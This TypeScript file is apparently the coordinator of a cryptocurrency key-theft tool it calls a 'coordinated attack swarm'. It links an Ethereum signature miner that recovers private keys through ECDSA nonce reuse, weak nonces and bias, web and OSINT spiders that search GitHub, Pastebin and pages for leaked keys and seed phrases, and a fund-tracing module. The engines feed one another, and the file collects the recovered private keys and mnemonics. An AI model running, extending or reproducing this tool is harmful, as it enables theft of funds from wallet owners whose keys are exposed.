/**
 * Hybrid Worm Engine — Unified Signature Mining Swarm
 * ═════════════════════════════════════════════════════
 * Combines all four individual engines into a single coordinated attack swarm.
 *
 * Cross-engine wiring (all via CrossEnginePool):
 *
 *   E1 → E2   tx-embedded URLs deposited to pendingSpiderUrls
 *   E1 → E3   every unique signing address → pendingOsintAddresses
 *   E1 → E4   nonce-reuse + r-collision addresses → pendingPeelAddresses
 *   E1 → pool raw r/s/z sigs → r-value registry
 *
 *   E2 → E3   private key → derive address → pendingOsintAddresses
 *   E2 → E4   private key → derive address → pendingPeelAddresses
 *   E2 → pool rs_pair + full ECDSA sigs → r-value registry
 *   E2 → E3   ETH addresses extracted from context text → OSINT
 *
 *   E3 → E2   source URLs from every finding → pendingSpiderUrls
 *   E3 → E4   private key derived address → pendingPeelAddresses
 *   E3 → E1   suspicious/raw_address findings → pendingE1TargetedAddresses
 *
 *   E4 → E3   every hop outgoingAddress → pendingOsintAddresses
 *   E4 → E1   nonceReuseAddresses at hops → pendingE1TargetedAddresses
 *   E4 → pool hop r-values → r-value registry
 */

import { logger } from "../logger";
import { runSignatureMiner,   type SigMinerFinding, type DiscoveredUrl }  from "./signature-miner";
import { runWebSigSpider,     type WebSigFind }        from "./web-sig-spider";
import { runOsintSigSpider,   type OsintFinding }      from "./osint-sig-spider";
import { runPeelChainTracer,  type PeelChainResult }   from "./peel-chain-tracer";
import {
  getCrossEnginePool,
  feedE1ToPool, feedE2ToPool, feedE3ToPool, feedE4ToPool,
  drainOsintAddresses, drainPeelAddresses, drainSpiderUrls,
  drainCrossNonceCandidates, drainE1TargetedAddresses,
} from "./cross-engine-pool";

// ── Types ─────────────────────────────────────────────────────────────────────

export type WormType = "block_scanner" | "web_spider" | "osint" | "peel_chain";

export interface WormTask {
  id:       string;
  type:     WormType;
  priority: number;   // higher = run sooner
  payload:  Record<string, unknown>;
}

export interface HybridFinding {
  source:       WormType;
  kind:         "private_key" | "mnemonic" | "ecdsa_sig" | "nonce_reuse" | "weak_k" | "r_collision" | "bias" | "xpub_xprv" | "keystore" | "other";
  address?:     string;
  privateKey?:  string;
  keyVerified:  boolean;
  value:        string;
  detail:       string;
  txHashes:     string[];
  url?:         string;
  confidence:   number;   // 0–1
  discoveredAt: string;
}

export interface WormStats {
  type:        WormType;
  runs:        number;
  findings:    number;
  errors:      number;
  lastRunAt:   string | null;
  hitRate:     number;   // findings / runs
  active:      boolean;
}

export interface HybridEngineResult {
  startedAt:      string;
  completedAt:    string;
  durationSecs:   number;
  totalWormRuns:  number;
  findings:       HybridFinding[];
  bySource:       Record<WormType, number>;
  privateKeys:    string[];
  mnemonics:      string[];
  stats:          Record<WormType, WormStats>;
  addressesFound: string[];
  scanConfig:     HybridEngineConfig;
  // URLs discovered by Engine 1 in tx input data and auto-fed to Engine 2
  chainedUrls:    Array<{
    url:         string;
    txHash:      string;
    fromAddress: string;
    blockNumber: number;
    source:      string;
  }>;
  chainedUrlCount: number;
}

export interface HybridEngineConfig {
  // Target seeds
  seedAddresses?:   string[];    // initial ETH addresses
  seedUrls?:        string[];    // initial URLs for web spider
  seedKeywords?:    string[];    // extra OSINT keywords

  // Engine enables
  enableBlockScanner?: boolean;  // default true
  enableWebSpider?:    boolean;  // default true
  enableOsint?:        boolean;  // default true
  enablePeelChain?:    boolean;  // default true

  // Worm concurrency per type
  blockScannerSlots?: number;    // default 3
  webSpiderSlots?:    number;    // default 4
  osintSlots?:        number;    // default 2
  peelChainSlots?:    number;    // default 3

  // Block scanner
  blockWindowSize?:   number;    // blocks per worm run, default 50
  totalBlockRange?:   number;    // total blocks to cover, default 500

  // Web spider
  maxUrlsPerSeed?:    number;    // default 100
  maxDepth?:          number;    // default 2

  // OSINT
  githubToken?:       string;
  osintMaxBlocks?:    number;    // default 20

  // Peel chain
  peelMaxHops?:       number;    // default 8
  peelChain?:         string;    // default "ethereum"

  // Scheduler
  jitterRange?:       [number, number]; // ms, default [50, 500]
  maxRunTimeMs?:      number;    // wall-clock cap, default 300_000 (5 min)
  minHitRateThresh?:  number;    // pause worm type below this rate, default 0.02

  // Callbacks
  onFinding?:         (f: HybridFinding) => void;
  onProgress?:        (stats: Record<WormType, WormStats>, totalFindings: number) => void;
}

// ── Shared state ──────────────────────────────────────────────────────────────

interface SharedState {
  findings:         HybridFinding[];
  privateKeys:      Set<string>;
  mnemonics:        Set<string>;
  addresses:        Set<string>;    // discovered addresses to process
  visitedUrls:      Set<string>;
  visitedAddresses: Set<string>;
  stats:            Record<WormType, WormStats>;
  // URLs discovered by Engine 1 that have been fed to Engine 2
  chainedUrls:      DiscoveredUrl[];
  pendingSpiderUrls: string[];      // queued for next web spider worm cycle
}

// ── Jitter ───────────────────────────────────────────────────────────────────

function jitter(range: [number, number]): Promise<void> {
  const ms = range[0] + Math.random() * (range[1] - range[0]);
  return new Promise(r => setTimeout(r, ms));
}

// ── Finding normalizers ───────────────────────────────────────────────────────

function fromSigFinding(f: SigMinerFinding): HybridFinding {
  const kind = f.attackType === "nonce_reuse"        ? "nonce_reuse"
             : f.attackType === "weak_k"             ? "weak_k"
             : f.attackType === "known_weak_k"       ? "weak_k"
             : f.attackType === "r_collision"        ? "r_collision"
             : f.attackType === "bias_detected"      ? "bias"
             : f.attackType === "polynomial_nonce"   ? "bias"
             : "ecdsa_sig";
  return {
    source:      "block_scanner",
    kind,
    address:     f.address,
    privateKey:  f.privateKey ?? undefined,
    keyVerified: f.keyVerified,
    value:       f.privateKey ?? f.r,
    detail:      f.detail,
    txHashes:    f.txHashes,
    confidence:  f.keyVerified ? 0.99 : 0.75,
    discoveredAt: f.discoveredAt,
  };
}

function fromWebFind(f: WebSigFind): HybridFinding {
  const kind = f.kind === "private_key_hex" || f.kind === "private_key_wif" ? "private_key"
             : f.kind === "bip39_mnemonic"  ? "mnemonic"
             : f.kind === "ecdsa_signature" ? "ecdsa_sig"
             : f.kind === "xpub_xprv"       ? "xpub_xprv"
             : f.kind === "keystore_json"   ? "keystore"
             : "other";
  return {
    source:      "web_spider",
    kind,
    value:       f.value,
    detail:      `Found ${f.kind} at depth ${f.depth}: ${f.context.slice(0, 100)}`,
    txHashes:    [],
    url:         f.url,
    keyVerified: false,
    confidence:  0.65,
    discoveredAt: f.discoveredAt,
  };
}

function fromOsintFind(f: OsintFinding): HybridFinding {
  const kind = f.kind === "private_key" ? "private_key"
             : f.kind === "mnemonic"    ? "mnemonic"
             : f.kind === "ecdsa_sig"   ? "ecdsa_sig"
             : f.kind === "xpub_xprv"   ? "xpub_xprv"
             : f.kind === "keystore"    ? "keystore"
             : "other";
  return {
    source:      "osint",
    kind,
    address:     f.address,
    value:       f.value,
    detail:      `[${f.source}] ${f.context.slice(0, 120)}`,
    txHashes:    f.txHash ? [f.txHash] : [],
    url:         f.url,
    keyVerified: false,
    confidence:  f.confidence,
    discoveredAt: f.discoveredAt,
  };
}

function fromPeelResult(p: PeelChainResult): HybridFinding[] {
  const out: HybridFinding[] = [];
  const ts = new Date().toISOString();
  for (const key of p.privateKeysFound) {
    out.push({
      source: "peel_chain", kind: "private_key",
      privateKey: key, keyVerified: true,
      value: key,
      detail: `Private key recovered via nonce reuse at peel-chain hop in ${p.chain} (${p.hops.length} hops traced)`,
      txHashes: [],
      confidence: 0.99, discoveredAt: ts,
    });
  }
  for (const addr of p.nonceReuseAddresses) {
    out.push({
      source: "peel_chain", kind: "nonce_reuse",
      address: addr, keyVerified: false,
      value: addr,
      detail: `Nonce reuse detected at ${addr} during peel-chain trace (${p.chain})`,
      txHashes: [],
      confidence: 0.9, discoveredAt: ts,
    });
  }
  return out;
}

// ── Worm runners ──────────────────────────────────────────────────────────────

async function runBlockScannerWorm(
  startBlock: number,
  windowSize: number,
  shared: SharedState,
  config: HybridEngineConfig,
): Promise<void> {
  const stat = shared.stats.block_scanner;
  stat.active = true;
  const pool = getCrossEnginePool();
  try {
    // Consume any E3/E4-targeted addresses so E1 deep-scans them this window
    const targetedAddrs = drainE1TargetedAddresses(pool, 15);
    const result = await runSignatureMiner({
      startBlock,
      blockCount:  windowSize,
      addresses:   targetedAddrs.length > 0 ? targetedAddrs : undefined,
      detectWeakK: true,
      detectBias:  true,
      detectPoly:  true,
      rCollision:  true,
    });
    for (const f of result.findings) {
      const hf = fromSigFinding(f);
      shared.findings.push(hf);
      if (hf.privateKey) shared.privateKeys.add(hf.privateKey);
      if (hf.address)    shared.addresses.add(hf.address);
      config.onFinding?.(hf);
    }

    // ── Feed Engine 1 output to cross-engine pool ─────────────────────────────
    // E1 → E2: tx-embedded URLs
    // E1 → E3: all signing addresses
    // E1 → E4: nonce-reuse + r-collision addresses
    // E1 → pool: raw r/s/z sig data
    const flows = feedE1ToPool(result, pool);

    // Merge pool's pendingSpiderUrls into shared.pendingSpiderUrls for the E1→2 consumer worm
    const newPoolUrls = drainSpiderUrls(pool, 30);
    for (const du of result.discoveredUrls) {
      if (!shared.visitedUrls.has(du.url)) {
        shared.chainedUrls.push(du);
        shared.pendingSpiderUrls.push(du.url);
      }
    }
    for (const u of newPoolUrls) {
      if (!shared.visitedUrls.has(u)) shared.pendingSpiderUrls.push(u);
    }

    // Pull E3 OSINT-queued addresses into shared.addresses so OSINT worm sees them
    const osintQ = drainOsintAddresses(pool, 20);
    for (const a of osintQ) shared.addresses.add(a);

    // Pull E4 peel-chain addresses into shared.addresses for peel worm
    const peelQ = drainPeelAddresses(pool, 10);
    for (const a of peelQ) shared.addresses.add(a);

    if (flows.toE3 > 0 || flows.toE4 > 0) {
      logger.info(
        { startBlock, windowSize, toE3: flows.toE3, toE4: flows.toE4, sigsReg: flows.sigsRegistered,
          txUrls: result.discoveredUrls.length },
        "E1→pool: cross-engine feeds dispatched",
      );
    }

    stat.runs++;
    stat.findings += result.findings.length;
    stat.lastRunAt = new Date().toISOString();
    stat.hitRate   = stat.findings / stat.runs;
  } catch (e) {
    stat.errors++;
    logger.warn({ err: String(e) }, "Block scanner worm error");
  } finally {
    stat.active = false;
  }
}

async function runWebSpiderWorm(
  seeds: string[],
  maxUrls: number,
  maxDepth: number,
  shared: SharedState,
  config: HybridEngineConfig,
): Promise<void> {
  const stat = shared.stats.web_spider;
  stat.active = true;
  const pool = getCrossEnginePool();
  try {
    const result = await runWebSigSpider({
      seeds,
      maxUrls,
      maxDepth,
      concurrency: 4,
      jitterMs: config.jitterRange,
    });
    for (const f of result.finds) {
      if (shared.visitedUrls.has(f.value)) continue;
      shared.visitedUrls.add(f.value);
      const hf = fromWebFind(f);
      shared.findings.push(hf);
      if (hf.kind === "private_key") shared.privateKeys.add(hf.value);
      if (hf.kind === "mnemonic")    shared.mnemonics.add(hf.value);
      config.onFinding?.(hf);
    }

    // ── Feed E2 output to cross-engine pool ───────────────────────────────────
    // E2 → E3: private key derived addresses
    // E2 → E4: private key derived addresses
    // E2 → pool: rs_pairs and ECDSA sigs → r-value registry
    // E2 → E3: ETH addresses from page context
    const flows = feedE2ToPool(result, pool);

    // Flush pool's new OSINT/peel addresses into shared pools
    const osintQ = drainOsintAddresses(pool, 15);
    for (const a of osintQ) shared.addresses.add(a);
    const peelQ = drainPeelAddresses(pool, 8);
    for (const a of peelQ) shared.addresses.add(a);

    // Flush any new spider URLs from pool (e.g., from E3 running in parallel)
    const moreUrls = drainSpiderUrls(pool, 20);
    for (const u of moreUrls) {
      if (!shared.visitedUrls.has(u)) shared.pendingSpiderUrls.push(u);
    }

    if (flows.toE3 > 0 || flows.toE4 > 0 || flows.sigsRegistered > 0) {
      logger.info(
        { seeds: seeds.length, toE3: flows.toE3, toE4: flows.toE4, sigsReg: flows.sigsRegistered },
        "E2→pool: cross-engine feeds dispatched",
      );
    }

    stat.runs++;
    stat.findings += result.finds.length;
    stat.lastRunAt = new Date().toISOString();
    stat.hitRate   = stat.findings / stat.runs;
  } catch (e) {
    stat.errors++;
    logger.warn({ err: String(e) }, "Web spider worm error");
  } finally {
    stat.active = false;
  }
}

async function runOsintWorm(
  addresses: string[],
  keywords: string[],
  shared: SharedState,
  config: HybridEngineConfig,
): Promise<void> {
  const stat = shared.stats.osint;
  stat.active = true;
  const pool = getCrossEnginePool();

  // Merge pool's OSINT address queue with the caller's addresses
  const poolAddrs = drainOsintAddresses(pool, 20);
  const allAddrs  = [...new Set([...addresses, ...poolAddrs])];
  // Merge pool's keyword set with caller's keywords
  const allKeywords = [...new Set([...keywords, ...[...pool.osintKeywords].slice(0, 6)])];

  try {
    const result = await runOsintSigSpider({
      addresses:        allAddrs,
      keywords:         allKeywords,
      githubToken:      config.githubToken,
      scanInputData:    true,
      scanEns:          true,
      scanGithub:       true,
      scanPastebin:     true,
      maxTxInputBlocks: config.osintMaxBlocks ?? 20,
    });
    for (const f of result.findings) {
      const hf = fromOsintFind(f);
      shared.findings.push(hf);
      if (hf.kind === "private_key") shared.privateKeys.add(hf.value);
      if (hf.kind === "mnemonic")    shared.mnemonics.add(hf.value);
      if (hf.address) shared.addresses.add(hf.address);
      config.onFinding?.(hf);
    }

    // ── Feed E3 output to cross-engine pool ───────────────────────────────────
    // E3 → E2: source URLs from every finding
    // E3 → E4: private key derived addresses
    // E3 → E1: raw_address / suspicious findings
    const flows = feedE3ToPool(result, pool);

    // Flush pool's new spider URLs into shared.pendingSpiderUrls
    const newUrls = drainSpiderUrls(pool, 20);
    for (const u of newUrls) {
      if (!shared.visitedUrls.has(u)) shared.pendingSpiderUrls.push(u);
    }

    // Flush peel-chain addresses into shared.addresses so peel worm picks them up
    const peelQ = drainPeelAddresses(pool, 10);
    for (const a of peelQ) shared.addresses.add(a);

    // Flush E1-targeted addresses into shared.addresses
    const e1Q = drainE1TargetedAddresses(pool, 10);
    for (const a of e1Q) shared.addresses.add(a);

    if (flows.toE2 > 0 || flows.toE4 > 0 || flows.toE1 > 0) {
      logger.info(
        { addrs: allAddrs.length, toE2: flows.toE2, toE4: flows.toE4, toE1: flows.toE1 },
        "E3→pool: cross-engine feeds dispatched",
      );
    }

    stat.runs++;
    stat.findings += result.findings.length;
    stat.lastRunAt = new Date().toISOString();
    stat.hitRate   = stat.findings / stat.runs;
  } catch (e) {
    stat.errors++;
    logger.warn({ err: String(e) }, "OSINT worm error");
  } finally {
    stat.active = false;
  }
}

async function runPeelChainWorm(
  address: string,
  config: HybridEngineConfig,
  shared: SharedState,
): Promise<void> {
  if (shared.visitedAddresses.has(address.toLowerCase())) return;
  shared.visitedAddresses.add(address.toLowerCase());
  const stat = shared.stats.peel_chain;
  stat.active = true;
  const pool = getCrossEnginePool();
  try {
    const result = await runPeelChainTracer({
      startAddress:     address,
      chain:            config.peelChain ?? "ethereum",
      maxHops:          config.peelMaxHops ?? 8,
      scanSigs:         true,
      correlateAmounts: true,
    });
    const hfs = fromPeelResult(result);
    for (const hf of hfs) {
      shared.findings.push(hf);
      if (hf.privateKey) shared.privateKeys.add(hf.privateKey);
      config.onFinding?.(hf);
    }
    // Add discovered addresses to shared pool for further scanning (existing behaviour)
    for (const hop of result.hops) {
      for (const addr of hop.outgoingAddresses) {
        shared.addresses.add(addr.toLowerCase());
      }
    }

    // ── Feed E4 output to cross-engine pool ───────────────────────────────────
    // E4 → E3: hop outgoingAddresses → OSINT
    // E4 → E1: nonceReuseAddresses at hops → targeted block scan
    // E4 → pool: hop r-values → r-value registry for cross-engine nonce check
    const flows = feedE4ToPool(result, pool);

    // Flush new OSINT targets into shared.addresses for next OSINT worm run
    const osintQ = drainOsintAddresses(pool, 15);
    for (const a of osintQ) shared.addresses.add(a);

    // Flush E1-targeted addresses into shared.addresses
    const e1Q = drainE1TargetedAddresses(pool, 10);
    for (const a of e1Q) shared.addresses.add(a);

    // Check if any cross-nonce candidates were found and create findings
    const crossNonce = drainCrossNonceCandidates(pool);
    for (const c of crossNonce) {
      shared.findings.push({
        source:      "peel_chain",
        kind:        "nonce_reuse",
        address:     c.addresses[0] ?? address,
        value:       c.r,
        detail:      `Cross-engine nonce reuse: same r in ${c.entries.length} sigs from ${[...new Set(c.entries.map(e => e.source))].join("+")}`,
        keyVerified: false,
        txHashes:    [],
        confidence:  0.92,
        discoveredAt: c.detectedAt,
      });
      // Add all candidate addresses to peel queue — top priority
      for (const a of c.addresses) shared.addresses.add(a);
    }

    if (flows.toE3 > 0 || flows.toE1 > 0 || crossNonce.length > 0) {
      logger.info(
        { address, hops: result.hops.length, toE3: flows.toE3, toE1: flows.toE1,
          crossNonce: crossNonce.length, sigsReg: flows.sigsRegistered },
        "E4→pool: cross-engine feeds dispatched",
      );
    }

    stat.runs++;
    stat.findings += hfs.length;
    stat.lastRunAt = new Date().toISOString();
    stat.hitRate   = stat.findings / stat.runs;
  } catch (e) {
    stat.errors++;
    logger.warn({ err: String(e), address }, "Peel chain worm error");
  } finally {
    stat.active = false;
  }
}

// ── Scheduler / coordinator ───────────────────────────────────────────────────

function initStats(): Record<WormType, WormStats> {
  const mk = (type: WormType): WormStats => ({
    type, runs: 0, findings: 0, errors: 0, lastRunAt: null, hitRate: 0, active: false,
  });
  return {
    block_scanner: mk("block_scanner"),
    web_spider:    mk("web_spider"),
    osint:         mk("osint"),
    peel_chain:    mk("peel_chain"),
  };
}

export async function runHybridEngine(
  config: HybridEngineConfig = {},
): Promise<HybridEngineResult> {
  const startedAt  = new Date().toISOString();
  const startMs    = Date.now();
  const maxRunMs   = config.maxRunTimeMs     ?? 300_000;
  const jitterRng  = config.jitterRange      ?? [50, 500];
  const minHitRate = config.minHitRateThresh ?? 0.02;

  const blockSlots  = config.blockScannerSlots ?? 3;
  const webSlots    = config.webSpiderSlots    ?? 4;
  const osintSlots  = config.osintSlots        ?? 2;
  const peelSlots   = config.peelChainSlots    ?? 3;
  const blockWin    = config.blockWindowSize   ?? 50;
  const totalBlocks = config.totalBlockRange   ?? 500;

  const enableBlock  = config.enableBlockScanner ?? true;
  const enableWeb    = config.enableWebSpider    ?? true;
  const enableOsint  = config.enableOsint        ?? true;
  const enablePeel   = config.enablePeelChain    ?? true;

  const seedAddresses = config.seedAddresses ?? [];
  const seedUrls      = config.seedUrls      ?? [];
  const keywords      = config.seedKeywords  ?? [
    "ethereum private key", "0x private key", "wallet seed phrase",
    "metamask seed", "wallet mnemonic", "privateKey 0x",
  ];

  const shared: SharedState = {
    findings:          [],
    privateKeys:       new Set<string>(),
    mnemonics:         new Set<string>(),
    addresses:         new Set<string>(seedAddresses.map(a => a.toLowerCase())),
    visitedUrls:       new Set<string>(),
    visitedAddresses:  new Set<string>(),
    stats:             initStats(),
    chainedUrls:       [],
    pendingSpiderUrls: [...seedUrls],  // pre-seed with any explicit config URLs
  };

  logger.info({
    seedAddresses: seedAddresses.length,
    seedUrls: seedUrls.length,
    totalBlocks, blockWin,
    maxRunMs,
  }, "Hybrid engine starting");

  const promises: Promise<void>[] = [];

  // ── Block scanner worms ───────────────────────────────────────────────────
  if (enableBlock) {
    // Divide total block range into windows for each slot
    const windowsPerSlot = Math.ceil(totalBlocks / blockWin / blockSlots);
    // We'll use the latest block as reference (passed via a dynamic start)
    for (let slot = 0; slot < blockSlots; slot++) {
      const slotStart = slot * windowsPerSlot * blockWin;
      promises.push((async () => {
        for (let w = 0; w < windowsPerSlot; w++) {
          if (Date.now() - startMs > maxRunMs) break;
          if (shared.stats.block_scanner.runs > 5 &&
              shared.stats.block_scanner.hitRate < minHitRate) {
            logger.info("Block scanner below hit rate threshold — pausing");
            break;
          }
          await jitter(jitterRng);
          await runBlockScannerWorm(slotStart + w * blockWin, blockWin, shared, config);
          config.onProgress?.(shared.stats, shared.findings.length);
        }
      })());
    }
  }

  // ── Web spider worms ──────────────────────────────────────────────────────
  if (enableWeb) {
    const allSeeds = seedUrls.length > 0 ? seedUrls : undefined;
    for (let slot = 0; slot < webSlots; slot++) {
      promises.push((async () => {
        if (Date.now() - startMs > maxRunMs) return;
        await jitter(jitterRng);
        await runWebSpiderWorm(
          allSeeds ?? [],
          config.maxUrlsPerSeed ?? 100,
          config.maxDepth ?? 2,
          shared, config,
        );
        config.onProgress?.(shared.stats, shared.findings.length);
      })());
    }

    // ── Dedicated Engine 1 → Engine 2 chain consumer ────────────────────────
    // This extra worm slot polls for URLs deposited by block scanner worms.
    // It runs in a loop, draining shared.pendingSpiderUrls in batches of 20
    // every 10 seconds. This means as Engine 1 finds tx-linked URLs in real
    // time, Engine 2 immediately starts crawling them in parallel.
    promises.push((async () => {
      while (Date.now() - startMs < maxRunMs) {
        // Wait a bit before each drain cycle so block scanner has time to populate
        await new Promise(r => setTimeout(r, 10_000));
        if (shared.pendingSpiderUrls.length === 0) continue;
        // Drain up to 20 URLs per cycle
        const batch = shared.pendingSpiderUrls.splice(0, 20);
        const fresh = batch.filter(u => !shared.visitedUrls.has(u));
        if (fresh.length === 0) continue;
        logger.info(
          { batchSize: fresh.length, remaining: shared.pendingSpiderUrls.length },
          "Engine 1→2 chain: crawling tx-linked URLs from block scanner",
        );
        await runWebSpiderWorm(
          fresh,
          50,   // tighter URL budget per chained batch
          2,
          shared, config,
        );
        config.onProgress?.(shared.stats, shared.findings.length);
      }
    })());
  }

  // ── OSINT worms ───────────────────────────────────────────────────────────
  if (enableOsint) {
    for (let slot = 0; slot < osintSlots; slot++) {
      promises.push((async () => {
        if (Date.now() - startMs > maxRunMs) return;
        await jitter(jitterRng);
        const addrsForOsint = [...shared.addresses].slice(slot * 10, (slot + 1) * 10);
        await runOsintWorm(addrsForOsint, keywords, shared, config);
        config.onProgress?.(shared.stats, shared.findings.length);
      })());
    }
  }

  // ── Peel chain worms ──────────────────────────────────────────────────────
  if (enablePeel && seedAddresses.length > 0) {
    const peelSeeds = seedAddresses.slice(0, peelSlots);
    for (const addr of peelSeeds) {
      promises.push((async () => {
        if (Date.now() - startMs > maxRunMs) return;
        await jitter(jitterRng);
        await runPeelChainWorm(addr, config, shared);
        config.onProgress?.(shared.stats, shared.findings.length);
        // Spawn child peel-chain worms for discovered addresses
        const discovered = [...shared.addresses]
          .filter(a => !shared.visitedAddresses.has(a))
          .slice(0, 2);
        for (const child of discovered) {
          if (Date.now() - startMs > maxRunMs) break;
          await jitter(jitterRng);
          await runPeelChainWorm(child, config, shared);
        }
      })());
    }
  }

  // Wait for all worms to finish (or timeout)
  const timeout = new Promise<void>(resolve => setTimeout(resolve, maxRunMs));
  await Promise.race([Promise.all(promises), timeout]);

  // Deduplicate findings
  const seen = new Set<string>();
  const unique = shared.findings.filter(f => {
    const k = `${f.kind}:${f.value.slice(0, 40)}`;
    if (seen.has(k)) return false;
    seen.add(k); return true;
  });

  const bySource: Record<WormType, number> = {
    block_scanner: 0, web_spider: 0, osint: 0, peel_chain: 0,
  };
  for (const f of unique) bySource[f.source] = (bySource[f.source] ?? 0) + 1;

  const completedAt  = new Date().toISOString();
  const durationSecs = (Date.now() - startMs) / 1000;

  logger.info({
    findings: unique.length,
    privateKeys: shared.privateKeys.size,
    durationSecs: durationSecs.toFixed(1),
  }, "Hybrid engine complete");

  return {
    startedAt,
    completedAt,
    durationSecs,
    totalWormRuns:  Object.values(shared.stats).reduce((s, st) => s + st.runs, 0),
    findings:       unique,
    bySource,
    privateKeys:    [...shared.privateKeys],
    mnemonics:      [...shared.mnemonics],
    stats:          shared.stats,
    addressesFound: [...shared.addresses],
    scanConfig:     config,
    chainedUrls:    shared.chainedUrls,
    chainedUrlCount: shared.chainedUrls.length,
  };
}
